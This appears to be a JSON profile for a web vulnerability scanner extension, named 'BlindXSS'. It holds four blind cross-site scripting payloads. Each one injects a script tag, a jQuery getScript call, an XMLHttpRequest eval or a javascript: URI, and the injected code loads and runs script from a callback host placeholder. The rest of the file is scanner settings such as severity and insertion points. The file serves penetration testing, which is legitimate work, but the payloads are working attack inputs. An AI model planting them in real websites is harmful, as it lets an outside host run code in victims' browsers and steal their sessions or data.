[{"Name":"BlindXSS","Enabled":false,"Scanner":1,"Author":"@egarme","Payloads":["\u003cscript\u003e$.getScript(\"//{BC}\")\u003c/script\u003e","\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//{BC}\");a.send();\u003c/script\u003e","\"\u003e\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e","javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027http://{BC}\\\u0027;document.body.appendChild(a)\u0027)"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["XSS","All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":0,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"BlindXSS","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"Blind XSS found with payloads: \u003cbr\u003e \u003cpayload\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[18,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127],"Scantype":0,"pathDiscovery":false}]